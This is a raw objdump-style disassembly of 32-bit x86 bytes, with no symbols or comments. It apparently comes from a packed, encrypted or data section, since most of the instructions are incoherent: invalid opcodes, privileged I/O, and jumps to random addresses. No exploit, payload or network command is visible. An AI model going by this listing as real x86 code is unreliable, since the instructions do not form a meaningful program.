  406274:	cmp    ch,cl
  406276:	mul    dl
  406278:	dec    edi
  406279:	pop    edi
  40627a:	pop    es
  40627b:	rcl    DWORD PTR [edi+0x59],0x49
  40627f:	jmp    0x5144c1ce
	...
  406298:	rcr    edx,1
  40629a:	div    BYTE PTR [esi]
  40629c:	es xchg edi,eax
  40629e:	pusha  
  40629f:	sub    al,0xc2
  4062a1:	push   esp
  4062a2:	or     BYTE PTR [esi],ah
  4062a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4062a5:	popf   
  4062a6:	loopne 0x406286
  4062a8:	push   edx
  4062a9:	jmp    0x2d44c3a4
  4062ae:	test   BYTE PTR [esi],0x12
  4062b1:	jl     0x4062e9
  4062b3:	call   0x64c5f747
  4062b8:	int    0xea
  4062ba:	div    dh
  4062bc:	pop    esi
  4062bd:	icebp  
  4062be:	mov    esi,0x84e9f222
  4062c3:	ins    BYTE PTR es:[edi],dx
  4062c4:	into   
  4062c5:	jmp    0x91bc:0xea38def6
  4062cc:	fucompp 
  4062ce:	test   cl,0xe7
  4062d1:	and    cl,BYTE PTR [eax]
  4062d3:	jmp    0xbff471ee
  4062d8:	shr    ecx,0x47
  4062db:	out    0x13,al
  4062dd:	in     eax,dx
  4062de:	pop    es
  4062df:	jmp    0xabdd7a73
  4062e4:	stos   BYTE PTR es:[edi],al
  4062e5:	jmp    0x84cef9e0
  4062ea:	or     cl,ch
  4062ec:	(bad)  
  4062ed:	pusha  
  4062ee:	ins    DWORD PTR es:[edi],dx
  4062ef:	pop    esp
  4062f0:	dec    esi
  4062f1:	mov    ebp,0x639d0058
  4062f6:	inc    edi
  4062f7:	inc    ecx
  4062f8:	cmc    
  4062f9:	jl     0x4062c9
  4062fb:	mov    dh,0x0
	...
  40630d:	add    BYTE PTR [eax],al
  40630f:	add    ch,ah
  406311:	xchg   esp,eax
  406312:	add    eax,eax
  406314:	clc    
  406315:	xchg   ecx,eax
  406316:	loope  0x4062c9
  406318:	cmc    
  406319:	xchg   esp,eax
  40631a:	or     BYTE PTR [ebp-0x9a9a8],cl
  406320:	inc    edx
  406321:	sbb    DWORD PTR [edx+0x2c],ecx
  406324:	adc    eax,0xf44ffbfd
  406329:	xchg   esp,eax
  40632a:	loopne 0x4062d5
  40632c:	cmp    edx,DWORD PTR [eax-0x1e9af4f8]
  406332:	or     ebp,ecx
  406334:	pop    ecx
  406335:	nop
  406336:	or     BYTE PTR [eax],al
  406338:	std    
  406339:	and    BYTE PTR [eax+0x41],al
  40633c:	mov    ch,0x67
  40633e:	jge    0x40634c
  406340:	lea    ebp,[esi]
  406342:	(bad)  
  406343:	inc    DWORD PTR [edx-0x6c3d62e7]
  406349:	imul   esi,edi,0x5ab8278d
  40634f:	push   eax
  406350:	lea    esp,[esi-0x3a]
  406353:	jmp    DWORD PTR [edx-0x3c]
  406356:	cmc    
  406357:	jne    0x4063be
  406359:	(bad)  
  40635a:	cmc    
  40635b:	jne    0x4063ba
  40635d:	jl     0x406379
  40635f:	inc    DWORD PTR [edx+0x69]
  406362:	loopne 0x40635d
  406364:	das    
  406365:	imul   esi,edi,0x4a17d6eb
  40636b:	sub    al,0xbc
  40636d:	push   cs
  40636e:	mov    esp,0x606902fe
  406373:	push   es
	...
  406388:	xchg   edi,eax
  406389:	shl    esi,cl
  40638b:	dec    al
  40638d:	pop    ds
  40638e:	idiv   bh
  406390:	add    bh,BYTE PTR [edx+ebx*2-0x49]
  406394:	mov    ebp,?
  406396:	or     cl,BYTE PTR [ebx]
  406398:	dec    esp
  406399:	or     dh,0x67
  40639c:	inc    eax
  40639d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40639e:	retf   
  40639f:	inc    DWORD PTR [edx]
  4063a1:	loope  0x4063a9
  4063a3:	call   0xffb49310
  4063a8:	repz mov al,ds:0x6eebfebf
  4063ae:	(bad)  
  4063b0:	sbb    BYTE PTR [eax+0x2d3cff74],bh
  4063b6:	mov    BYTE PTR [ebp+0x7c],bh
  4063b9:	std    
  4063ba:	dec    BYTE PTR [esp+esi*1]
  4063bd:	pop    eax
  4063be:	fiadd  DWORD PTR [eax-0x74]
  4063c1:	or     eax,0xfe032263
  4063c6:	or     ch,bl
  4063c8:	mov    DWORD PTR [ebp+0xa],esp
  4063cb:	add    BYTE PTR [ebp+edi*8+0x1cc0ad0],cl
  4063d2:	add    dl,BYTE PTR [edx-0x65]
  4063d5:	or     BYTE PTR [ebx],al
  4063d7:	call   0xffb4fbd6
  4063dc:	je     0x406427
  4063de:	inc    ecx
  4063df:	inc    DWORD PTR [ebx+0x7ac28e78]
  4063e5:	fidiv  WORD PTR [edx+0x50]
  4063e8:	jae    0x40638a
  4063ea:	mov    bh,0xfe
	...
  406400:	imul   ebp,esi,0x63
  406403:	add    BYTE PTR [edx],bl
  406405:	std    
  406406:	or     al,BYTE PTR [ebp+0x1087ee4c]
  40640c:	push   ebx
  40640d:	(bad)  
  40640e:	jb     0x40640f
  406410:	add    DWORD PTR [ecx],edx
  406412:	jb     0x406413
  406414:	inc    ebx
  406415:	lds    edi,FWORD PTR [esi-0x4b]
  406418:	mov    ebp,?
  40641a:	jno    0x4063d1
  40641c:	hlt    
  40641d:	ss jae 0x40641f
  406420:	xor    al,0x94
  406422:	add    eax,0xb7e7234e
  406427:	inc    esi
  406428:	mov    BYTE PTR [esp+esi*1-0x52ecdf71],dl
  40642f:	js     0x406404
  406431:	push   eax
  406432:	lea    eax,[esp+ecx*4]
  406435:	xchg   esp,eax
  406436:	loope  0x4064b2
  406438:	sbb    DWORD PTR [eax-0x193d5877],0x5fcc0f65
  406442:	or     ecx,DWORD PTR [ebp-0xeaa17b7]
  406448:	mov    esp,edi
  40644a:	shl    DWORD PTR [edi-0x1c],cl
  40644d:	retf   
  40644e:	adc    edi,DWORD PTR [ebx-0x35]
  406451:	inc    ebx
  406452:	dec    esi
  406453:	icebp  
  406454:	(bad)  
  406455:	sti    
  406456:	lock dec ebp
  406458:	mov    ebx,0xb7c16de6
  40645d:	jns    0x40643f
  40645f:	jp     0x406482
  406461:	call   0x415593
	...
  406476:	add    BYTE PTR [eax],al
  406478:	mov    edi,esp
  40647a:	fdivr  QWORD PTR [ecx-0x65]
  40647d:	out    0x1d,al
  40647f:	icebp  
  406480:	xchg   edi,eax
  406481:	sti    
  406482:	clc    
  406483:	dec    ebp
  406484:	mov    esp,esi
  406486:	aaa    
  406487:	inc    esi
  406488:	nop
  406489:	xchg   esp,eax
  40648a:	pushf  
  40648b:	mov    gs,WORD PTR [eax+0x14]
  40648e:	and    eax,0xe5e67274
  406493:	in     eax,dx
  406494:	imul   edi,DWORD PTR [edx+eiz*8+0x7a],0xffffffd9
  406499:	pushf  
  40649a:	fnstenv [edx]
  40649c:	push   ebx
  40649d:	out    0xdd,al
  40649f:	mov    ecx,cs
  4064a1:	call   0x94cd64ee
  4064a6:	loope  0x406430
  4064a8:	or     esi,ebx
  4064aa:	mov    dh,0x7a
  4064ac:	cmp    eax,DWORD PTR [ebp+0x8]
  4064af:	rol    DWORD PTR [eax+eiz*1],0x8
  4064b3:	jmp    0x6d473952
  4064b8:	jmp    0x990:0x54e90894
  4064bf:	jmp    0x71cffa53
  4064c4:	(bad)  
  4064c5:	xchg   esp,eax
  4064c6:	or     BYTE PTR [ecx],dl
  4064c8:	test   DWORD PTR [ebx+0x49],eax
  4064cb:	jmp    0x783f74d4
  4064d0:	jbe    0x4064b7
  4064d2:	push   edi
  4064d3:	sub    ebp,0x1066f6d8
  4064d9:	adc    al,bh
  4064db:	pop    edi
	...
  4064f0:	push   esi
  4064f1:	in     eax,0xf6
  4064f3:	pushf  
  4064f4:	pop    edi
  4064f5:	out    0xf6,al
  4064f7:	dec    esi
  4064f8:	mov    bh,0x91
  4064fa:	or     ecx,ebp
  4064fc:	(bad)  
  4064fd:	pop    ss
  4064fe:	lea    esi,[esi]
  406500:	xor    eax,0xa799f6e5
  406505:	pop    ds
  406506:	inc    eax
  406507:	test   al,0x8f
  406509:	jl     0x406525
  40650b:	mov    ebx,0xf26ee5c8
  406510:	rcl    DWORD PTR [eax+ecx*1+0x1],0xca
  406515:	and    BYTE PTR [eax],cl
  406517:	jmp    0xd8bc39b6
  40651c:	jno    0x406503
  40651e:	and    DWORD PTR [esi+edi*8-0x1a],0xfffffff6
  406523:	neg    BYTE PTR [esi-0x1a]
  406526:	jl     0x406509
  406528:	test   DWORD PTR [edx],0xe5e5e6f5
  40652e:	mov    esp,0xf6e5d6d9
  406533:	inc    ecx
  406534:	mov    WORD PTR [ebx+0xf12e908],ss
  40653a:	inc    DWORD PTR [eax]
  40653c:	dec    ebx
  40653d:	imul   esi,edi,0x50
  406540:	frstor [edx]
  406542:	inc    eax
  406543:	inc    ecx
  406544:	and    eax,0x74521cf9
  406549:	nop
  40654a:	pusha  
  40654b:	or     esp,DWORD PTR [edi-0x2f]
  40654e:	mul    bh
  406550:	sbb    eax,0x836
	...
  406565:	add    BYTE PTR [eax],al
  406567:	add    BYTE PTR [esi],ch
  406569:	push   ecx
  40656a:	jl     0x40657d
  40656c:	(bad)  
  40656d:	nop
  40656e:	test   DWORD PTR [ebp-0x8957e],eax
  406574:	xchg   ebp,eax
  406575:	imul   edi,DWORD PTR [ebp+0x8],0xd
  406579:	retf   
  40657a:	repz (bad) 
  40657c:	jp     0x4065e9
  40657e:	mov    ebp,0xf76b6bf0
  406583:	call   0x37bfad
  406588:	iret   
  406589:	mov    bh,0xe0
  40658b:	xchg   ecx,eax
  40658c:	test   al,0x6b
  40658e:	test   DWORD PTR [ebx],0x6812e475
  406594:	dec    ecx
  406595:	rol    DWORD PTR [edi+0x0],0x15
  406599:	jns    0x4065b0
  40659b:	int    0x7a
  40659d:	imul   ebx,DWORD PTR [eax+0x6a],0xffffffb5
  4065a1:	shl    ch,0x75
  4065a4:	popf   
  4065a5:	js     0x4065e1
  4065a7:	std    
  4065a8:	jp     0x406615
  4065aa:	loopne 0x4065c5
  4065ac:	lods   al,BYTE PTR ds:[esi]
  4065ad:	pop    ebp
  4065ae:	imul   DWORD PTR [eax-0x52]
  4065b1:	mov    DWORD PTR [edi+0x0],0x75f7821f
  4065b8:	ins    DWORD PTR es:[edi],dx
  4065b9:	jo     0x40655d
  4065bb:	(bad)  
  4065bc:	jp     0x40661b
  4065be:	pusha  
  4065bf:	(bad)  [edi+edx*8+0x5d8669f6]
  4065c6:	jge    0x4065d0
  4065c8:	mov    ebp,ss
  4065ca:	xchg   ebx,eax
  4065cb:	inc    BYTE PTR [eax]
	...
  4065dd:	add    BYTE PTR [eax],al
  4065df:	add    BYTE PTR [ebx-0x2d],cl
  4065e2:	loop   0x4065be
  4065e4:	(bad)  [esp+ecx*1-0x19dd6796]
  4065eb:	pop    es
  4065ec:	and    al,0x7a
  4065ee:	jno    0x4065ef
  4065f0:	sub    esi,DWORD PTR [ebx]
  4065f2:	out    0xfb,al
  4065f4:	and    eax,DWORD PTR [ecx+0x3bbbe804]
  4065fa:	jo     0x4065fb
  4065fc:	inc    ebp
  4065fd:	xor    bh,dh
  4065ff:	jmp    DWORD PTR [eax+0x76]
  406602:	outs   dx,DWORD PTR ds:[esi]
  406603:	push   0xbe5fed8c
  406608:	sti    
  406609:	call   0xf5ba651c
  40660e:	(bad)  
  40660f:	xlat   BYTE PTR ds:[ebx]
  406610:	cli    
  406611:	jb     0x406683
  406613:	leave  
  406614:	into   
  406615:	in     eax,0xa
  406617:	push   ebp
  406618:	pop    es
  406619:	push   edx
  40661a:	mov    esp,es
  40661c:	aam    0xb2
  40661e:	mov    dh,0xfb
  406620:	mov    ebp,gs
  406622:	or     al,BYTE PTR [eax]
  406624:	adc    DWORD PTR [ecx],esi
  406626:	jg     0x406678
  406628:	and    al,0x98
  40662a:	fiadd  WORD PTR [eax-0x74]
  40662d:	stos   BYTE PTR es:[edi],al
  40662e:	out    0xb,al
  406630:	stos   DWORD PTR es:[edi],eax
  406631:	call   0xed8dae88
  406636:	bound  edi,QWORD PTR [edx+0xb7082c7]
  40663c:	int3   
  40663d:	add    DWORD PTR [ecx],edx
  40663f:	mov    ecx,edx
  406641:	test   ebx,esp
	...
  406657:	add    BYTE PTR [edx+ecx*4-0x1dfe004f],cl
  40665e:	jle    0x4066d5
  406660:	je     0x40664c
  406662:	in     al,0x7
  406664:	je     0x406693
  406666:	popa   
  406667:	jmp    DWORD PTR [ebx-0x6c]
  40666a:	out    dx,al
  40666b:	icebp  
  40666c:	arpl   sp,bp
  40666e:	pusha  
  40666f:	dec    esp
  406670:	push   ebx
  406671:	jecxz  0x40661a
  406673:	inc    edx
  406674:	xchg   esp,eax
  406675:	xchg   esp,eax
  406676:	cmp    al,0x8b
  406678:	xor    BYTE PTR ds:0xe33ab0a5,dl
  40667e:	mov    ch,0x3f
  406680:	or     DWORD PTR [edi+edi*4],ebx
  406683:	ja     0x4066b0
  406685:	xchg   esp,eax
  406686:	loope  0x40668b
  406688:	mov    WORD PTR [edi],cs
  40668a:	and    al,0x8
  40668c:	xchg   esp,edx
  40668e:	sbb    al,0x1
  406690:	or     al,0x9c
  406692:	loope  0x406684
  406694:	nop
  406695:	in     eax,dx
  406696:	in     al,dx
  406697:	add    al,0x8c
  406699:	xchg   esp,eax
  40669a:	mov    ?,ecx
  40669c:	mov    esp,ebx
  40669e:	sti    
  40669f:	pop    es
  4066a0:	in     al,0xef
  4066a2:	test   eax,0x1143eb77
  4066a7:	ja     0x406702
  4066a9:	mov    WORD PTR [ecx-0x22],ds
  4066ac:	(bad)  
  4066ae:	push   ebp
  4066af:	ins    BYTE PTR es:[edi],dx
  4066b0:	xchg   edx,eax
  4066b1:	int3   
  4066b2:	pop    ebp
  4066b3:	ja     0x4066e9
  4066b5:	fcom   QWORD PTR [ebp-0x4c1e3c3c]
  4066bb:	pop    es
	...
  4066d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4066d1:	ret    
  4066d2:	cmp    DWORD PTR [edi-0x4d],esi
  4066d5:	or     al,0x64
  4066d7:	mov    esp,0xec25e2aa
  4066dc:	popa   
  4066dd:	xchg   ebp,eax
  4066de:	loope  0x4066e3
  4066e0:	or     DWORD PTR [ecx],ebx
  4066e2:	and    esi,DWORD PTR [esi-0x6d]
  4066e5:	loop   0x406697
  4066e7:	imul   edx,esp,0xffffffcc
  4066ea:	add    eax,0x23181177
  4066ef:	jbe    0x40676c
  4066f1:	loop   0x406683
  4066f3:	jbe    0x40672e
  4066f5:	sbb    eax,0xe1e2f708
  4066fa:	fbstp  TBYTE PTR [ebx+0x1e]
  4066fd:	xchg   ebp,eax
  4066fe:	or     BYTE PTR [eax+0xc],dh
  406701:	and    esi,esi
  406703:	(bad)  
  406705:	push   esp
  406706:	pop    es
  406707:	ins    DWORD PTR es:[edi],dx
  406708:	sub    dl,BYTE PTR [ebp+0x814e908]
  40670e:	retf   0xc2c7
  406711:	loope  0x406711
  406713:	jmp    0x4066b4
  406715:	xchg   esp,eax
  406716:	or     cl,ch
  406718:	cmp    esp,DWORD PTR [esi-0x7b]
  40671b:	push   esp
  40671c:	int    0xe2
  40671e:	mul    BYTE PTR [esi+0x39245704]
  406724:	and    bh,ah
  406726:	inc    esi
  406727:	sub    BYTE PTR [eax-0x70a5a714],dl
  40672d:	xchg   esp,eax
  40672e:	add    ebp,DWORD PTR [ecx+0x23e393fc]
	...
  406748:	add    eax,0x6277ca08
  40674d:	loope  0x4066d3
  40674f:	sub    esi,DWORD PTR [esp+eax*2+0x54d25c60]
  406756:	or     BYTE PTR [ecx-0x5e],dl
  406759:	and    eax,0xd496e908
  40675e:	jl     0x40674b
  406760:	ss push esp
  406762:	test   DWORD PTR [ebp+ecx*2-0x1e],ebx
  406766:	idiv   BYTE PTR [esi]
  406768:	add    al,0x57
  40676a:	and    al,0x60
  40676c:	or     al,0x29
  40676e:	imul   BYTE PTR [esi]
  406770:	sbb    ch,BYTE PTR [esp+edi*4-0x4f]
  406774:	shl    cl,1
  406776:	cmc    
  406777:	xchg   esp,eax
  406778:	mov    ebp,esp
  40677a:	xor    esp,DWORD PTR [edx]
  40677c:	add    ah,dl
  40677e:	not    BYTE PTR [ebx+esi*1-0x1e]
  406782:	test   BYTE PTR [eax],0x92
  406785:	(bad)
  406788:	mov    esi,0xe8fff76a
  40678d:	test   DWORD PTR [eax-0x18],ebx
  406790:	fimul  WORD PTR [esi-0x9]
  406793:	call   DWORD PTR [ebp+0x5d75f5c8]
  406799:	ins    DWORD PTR es:[edi],dx
  40679a:	test   eax,0xe06762fe
  40679f:	jns    0x40678b
  4067a1:	test   WORD PTR [ebp-0x9a958],0xc7f2
  4067aa:	cmc    
  4067ab:	mov    ch,0x0
	...
  4067bd:	add    BYTE PTR [eax],al
  4067bf:	add    BYTE PTR [ecx+0x4dfff76a],ah
  4067c5:	inc    ecx
  4067c6:	mov    edx,0xc8622500
  4067cb:	push   gs
  4067cd:	hlt    
  4067ce:	cmc    
  4067cf:	jmp    DWORD PTR [edx]
  4067d1:	addr16 mov ebp,0xf76713bc
  4067d7:	call   0x488e09
  4067dc:	jb     0x40680f
  4067de:	mov    al,0xfe
  4067e0:	bound  esp,QWORD PTR [edi-0x20]
  4067e3:	dec    ecx
  4067e4:	sub    ah,BYTE PTR [edi-0x9]
  4067e7:	leave  
  4067e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4067e9:	mov    WORD PTR [eax],cs
  4067eb:	push   ebp
  4067ec:	pop    esi
  4067ed:	ins    BYTE PTR es:[edi],dx
  4067ee:	mov    eax,esp
  4067f0:	popa   
  4067f1:	addr16 jge 0x406800
  4067f4:	dec    ebp
  4067f5:	pop    ss
  4067f6:	ret    
  4067f7:	call   DWORD PTR [edx+0xd]
  4067fa:	dec    ebp
  4067fb:	cld    
  4067fc:	mov    esi,0x31840754
  406801:	cwde   
  406802:	or     BYTE PTR [eax],al
  406804:	int    0xbb
  406806:	pop    ecx
  406807:	inc    ecx
  406808:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406809:	addr16 jge 0x406808
  40680c:	jge    0x406838
  40680e:	ret    0x8cff
  406811:	xchg   ah,bl
  406813:	xor    BYTE PTR [bp+di],bl
  406816:	retf   0xcbff
  406819:	xchg   esi,eax
  40681a:	out    0x7,eax
  40681c:	fs dec edx
  40681e:	jle    0x40681f
  406820:	imul   edx,DWORD PTR [esi+0xc701],0x0
	...
  406837:	add    BYTE PTR [ebx-0x11],ah
  40683a:	loop   0x4068ab
  40683c:	mov    edi,0xd9ff0cac
  406841:	shl    DWORD PTR [edx-0x63],0x56
  406845:	(bad)  
  406846:	jnp    0x406898
  406848:	mov    ah,0x61
  40684a:	fadd   DWORD PTR [eax-0x74]
  40684d:	jge    0x4068cc
  40684f:	jne    0x4067d5
  406851:	(bad)
  406854:	sub    esp,DWORD PTR [edi]
  406856:	arpl   dx,bp
  406858:	dec    edx
  406859:	das    
  40685a:	jl     0x4068c4
  40685c:	add    eax,0x12ffcb9b
  406861:	mov    DWORD PTR [eax-0x18],esi
  406864:	mov    BYTE PTR [ebx],dh
  406866:	jl     0x406867
  406868:	pop    esp
  406869:	xchg   ebp,eax
  40686a:	mov    al,ds:0xdaed4d53
  40686f:	(bad)  
  406870:	jns    0x406857
  406872:	bound  edx,QWORD PTR [edx-0x16]
  406875:	data16 jl 0x406860
  406878:	aad    0x37
  40687a:	jl     0x40687b
  40687c:	fs or  bl,al
  40687f:	inc    eax
  406880:	mov    WORD PTR [esi],?
  406882:	out    0xfb,al
  406884:	mov    ah,0x22
  406886:	inc    ecx
  406887:	inc    ebx
  406889:	sbb    eax,0x2c5fabe3
  40688e:	or     edx,DWORD PTR [eax-0x4d]
  406891:	sub    BYTE PTR [ebx],al
  406893:	call   0xffbd0ff5
  406898:	mov    ah,0x15
  40689a:	xor    eax,0xff
	...
  4068af:	add    BYTE PTR [ebx-0x6811d16c],bl
  4068b5:	in     al,dx
  4068b6:	inc    eax
  4068b7:	cmp    eax,0x4127df8b
  4068bc:	xchg   esp,eax
  4068bd:	xchg   esp,eax
  4068be:	mov    esp,0x25136888
  4068c3:	ja     0x4068a0
  4068c5:	push   0xffffffe1
  4068c7:	jmp    0xbb4485b
  4068cc:	je     0x4068a3
  4068ce:	and    DWORD PTR [ebx+ebx*2+0xd],esi
  4068d2:	and    al,0x70
  4068d4:	pop    es
  4068d5:	mov    eax,ds:0x94ccbc35
  4068da:	popa   
  4068db:	xor    ecx,DWORD PTR [eax+ebp*2+0x4298dc1a]
  4068e2:	and    BYTE PTR [ebx+ebx*8],al
  4068e5:	in     al,dx
  4068e6:	int3   
  4068e7:	mov    dh,0x8c
  4068e9:	xchg   esp,eax
  4068ea:	jmp    0x545c:0x1e7e9843
  4068f1:	les    ebp,FWORD PTR [ebp+0x1cd48773]
  4068f7:	sbb    BYTE PTR [esp+ebp*2+0x4d],bl
  4068fb:	xlat   BYTE PTR ds:[ebx]
  4068fc:	dec    esp
  4068fd:	xchg   esp,eax
  4068fe:	xor    DWORD PTR [ebx-0x7f],esi
  406901:	mov    WORD PTR [ecx+0x75def15b],ds
  406907:	pop    esp
  406908:	pop    edx
  406909:	(bad)  
  40690a:	jge    0x40697f
  40690c:	loopne 0x4068b0
  40690e:	mov    eax,ds:0x6ddedbad
  406913:	jae    0x406915
	...
  406925:	add    BYTE PTR [eax],al
  406927:	add    dh,bl
  406929:	sub    eax,0xd9410b29
  40692e:	retf   0xc30d
  406931:	push   0xddbd5be9
  406936:	dec    ebp
  406937:	jae    0x40695f
  406939:	mov    bl,0x36
  40693b:	stc    
  40693c:	xchg   ebx,eax
  40693d:	in     al,dx
  40693e:	pop    es
  40693f:	dec    esi
  406940:	push   ds
  406941:	fcomip st,st(6)
  406943:	ret    
  406944:	mov    ebx,edi
  406946:	jl     0x406939
  406948:	aaa    
  406949:	shl    ebp,0x1e
  40694c:	jmp    FWORD PTR [edx+0x2e]
  40694f:	push   ss
  406950:	test   DWORD PTR [esi-0x2201c520],edx
  406956:	not    BYTE PTR [ecx-0x16b6bd52]
  40695c:	fisub  WORD PTR [edi+0x0]
  40695f:	add    DWORD PTR [ebp-0x1f],edx
  406962:	imul   dh
  406964:	aaa    
  406965:	inc    ecx
  406966:	pop    edx
  406967:	sub    BYTE PTR [eax-0x180e8323],cl
  40696d:	pushf  
  40696e:	cmc    
  40696f:	(bad)  
  406970:	mov    esi,0x513b9b6c
  406975:	fdivrp st(5),st
  406977:	cmp    al,0x30
  406979:	mul    BYTE PTR [edx]
  40697b:	mov    esp,0xa85fdd9e
  406980:	cmp    DWORD PTR [ebp+0x8],edx
  406983:	scas   al,BYTE PTR es:[edi]
  406984:	adc    al,0x96
  406986:	loopne 0x40698f
  406988:	popf   
  406989:	(bad)  
  40698b:	adc    DWORD PTR [eax],eax
	...
  40699d:	add    BYTE PTR [eax],al
  40699f:	add    BYTE PTR [edi+0x7ee94942],al
  4069a5:	add    BYTE PTR [bx+di-0x2060],al
  4069aa:	test   BYTE PTR [esi+0x285bb8d7],0x90
  4069b1:	fnstsw WORD PTR [ecx+eiz*8+0x47]
  4069b5:	cwde   
  4069b6:	cmc    
  4069b7:	outs   dx,BYTE PTR ds:[esi]
  4069b8:	pop    esi
  4069b9:	fnstsw WORD PTR [ebp+eiz*2+0x5e]
  4069bd:	add    BYTE PTR [bx+di+0x7c],dl
  4069c1:	shl    esi,1
  4069c3:	push   esi
  4069c4:	fmulp  st(4),st
  4069c6:	leave  
  4069c7:	in     eax,0x8f
  4069c9:	inc    edi
  4069ca:	add    DWORD PTR [eax],0x59
  4069cd:	push   ss
  4069ce:	jne    0x4069dc
  4069d0:	mov    ch,0xe5
  4069d2:	sbb    al,0xff
  4069d4:	loopne 0x406957
  4069d6:	div    DWORD PTR [ebp-0x47]
  4069d9:	bound  edi,QWORD PTR [ebp+0x8]
  4069dc:	jge    0x4069ff
  4069de:	jecxz  0x4069df
  4069e0:	stos   BYTE PTR es:[edi],al
  4069e1:	bound  edi,QWORD PTR [ebp+0xc]
  4069e4:	lea    ecx,[esi]
  4069e6:	int    0xff
  4069e8:	mov    ah,BYTE PTR [eax-0x439af336]
  4069ee:	sub    esp,0x6af455f6
  4069f4:	jne    0x406a58
  4069f6:	jge    0x406a0c
  4069f8:	push   0xffffffe5
  4069fa:	push   es
  4069fb:	push   DWORD PTR [eax-0x2661f6c]
  406a01:	(bad)  
  406a02:	test   DWORD PTR [ebx],0x0
	...
  406a18:	cmc    
  406a19:	fist   DWORD PTR [edx-0x77]
  406a1c:	jo     0x406a82
  406a1e:	pusha  
  406a1f:	sbb    eax,0xfef6d191
  406a24:	pusha  
  406a25:	fs loopne 0x406a34
  406a28:	in     al,dx
  406a29:	(bad)  
  406a2a:	imul   DWORD PTR [eax+0x25]
  406a2d:	xchg   ecx,eax
  406a2e:	out    0xbe,eax
  406a30:	push   ebp
  406a31:	arpl   WORD PTR [ebp+0x8],di
  406a34:	sbb    eax,0x1afff735
  406a39:	shr    BYTE PTR [esi],0x54
  406a3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406a3d:	cwde   
  406a3e:	div    DWORD PTR [ebp+0x9]
  406a41:	inc    eax
  406a42:	stc    
  406a43:	enter  0x636a,0x60
  406a47:	add    ebp,esi
  406a49:	jae    0x406a01
  406a4b:	push   eax
  406a4c:	push   0xffffffe5
  406a4e:	push   cs
  406a4f:	call   0x37cdb3
  406a54:	frstor [edi-0x1473bea4]
  406a5a:	ja     0x406ad1
  406a5c:	mov    eax,0xb3c85252
  406a61:	push   ebp
  406a62:	aam    0x1
  406a64:	mov    WORD PTR [esi-0x46],cs
  406a67:	push   eax
  406a68:	mov    ds:0x2be7f31f,eax
  406a6d:	scas   al,BYTE PTR es:[edi]
  406a6e:	jns    0x406a6f
  406a70:	xchg   ebx,eax
  406a71:	jmp    DWORD PTR [esi-0x18]
  406a74:	lods   eax,DWORD PTR ds:[esi]
  406a75:	mov    al,0x79
  406a77:	call   DWORD PTR [ebp-0x50]
  406a7a:	sbb    al,0x0
	...
  406a90:	loope  0x406b08
  406a92:	push   0xc9f9cc68
  406a97:	jmp    FWORD PTR [edx+0x61]
  406a9a:	mul    edi
  406a9c:	xor    BYTE PTR [esi+0x615bff79],dh
  406aa2:	sbb    edx,DWORD PTR [eax+0x64]
  406aa5:	mov    ebx,0xbb4bff32
  406aaa:	std    
  406aab:	adc    ebx,esp
  406aad:	ret    0x7fd
  406ab0:	and    al,0x8c
  406ab2:	jns    0x406ab3
  406ab4:	xor    eax,DWORD PTR [esi-0x38]
  406ab7:	push   ebx
  406ab8:	int    0xed
  406aba:	ja     0x406b31
  406abc:	nop
  406abd:	aad    0x74
  406abf:	enter  0x2b1b,0x78
  406ac3:	jne    0x406b41
  406ac5:	popf   
  406ac6:	push   esp
  406ac7:	aad    0xd4
  406ac9:	cli    
  406aca:	ja     0x406acb
  406acc:	jns    0x406aa7
  406ace:	(bad)  
  406ad0:	xor    ebp,0x12f31c52
  406ad6:	js     0x406aa1
  406ad8:	into   
  406ad9:	mov    ebp,0x1217550a
  406ade:	mov    esp,es
  406ae0:	fsubr  DWORD PTR [edx-0x2]
  406ae3:	or     esp,esp
  406ae5:	xchg   esp,eax
  406ae6:	or     eax,0xf9dbcb3b
  406aeb:	inc    ebx
  406aec:	cmp    BYTE PTR [esi+0x68],cl
  406aef:	(bad)  
  406af0:	mov    bh,0x6c
  406af2:	loope  0x406af7
	...
  406b08:	mov    ds:0x400ed91a,eax
  406b0d:	push   ebp
  406b0e:	loope  0x406b80
  406b10:	sbb    eax,ebx
  406b12:	cmp    eax,0x69ec93f6
  406b17:	jo     0x406aac
  406b19:	fistp  DWORD PTR [eax+0x56eb8c02]
  406b1f:	fld    TBYTE PTR [ebx+0x7b03a040]
  406b25:	popa   
  406b26:	add    eax,0x198cf970
  406b2b:	stc    
  406b2c:	push   0xffffffdb
  406b2e:	cmc    
  406b2f:	fimul  DWORD PTR [ebp-0x1b4ef16c]
  406b35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b36:	popf   
  406b37:	ret    0xda53
  406b3a:	push   ebx
  406b3b:	jo     0x406b88
  406b3d:	popa   
  406b3e:	stc    
  406b3f:	pop    ebx
  406b40:	lods   eax,DWORD PTR ds:[esi]
  406b41:	fcmovnu st,st(5)
  406b43:	outs   dx,DWORD PTR ds:[esi]
  406b44:	cmp    esp,DWORD PTR [ecx-0x3b]
  406b47:	pop    esp
  406b48:	mov    edx,0x556fcdd0
  406b4d:	(bad)  
  406b4e:	clc    
  406b4f:	add    edi,DWORD PTR [ecx+0x5083cd0f]
  406b55:	fmul   DWORD PTR [edx+0x4]
  406b58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406b59:	xchg   ecx,eax
  406b5a:	scas   al,BYTE PTR es:[edi]
  406b5b:	stc    
  406b5c:	xchg   ebx,eax
  406b5d:	in     al,dx
  406b5e:	mov    BYTE PTR [ebp+0x3],al
  406b61:	(bad)  [edi-0x37]
  406b64:	imul   DWORD PTR [ebx+0x77]
  406b67:	ror    DWORD PTR [esp+edx*4+0x19],cl
  406b6b:	mov    eax,0x0
	...
  406b80:	aas    
  406b81:	push   ebp
  406b82:	loope  0x406bf2
  406b84:	cdq    
  406b85:	mov    esp,0xdad12107
  406b8a:	cmc    
  406b8b:	hlt    
  406b8c:	xlat   BYTE PTR ds:[ebx]
  406b8d:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406b8f:	addr16 cmp ebx,ebx
  406b92:	pop    edi
  406b93:	jmp    0xc148bf73
  406b98:	ja     0x406be1
  406b9a:	dec    ecx
  406b9b:	jmp    0xb2110cc2
  406ba0:	rcr    dl,1
  406ba2:	cmc    
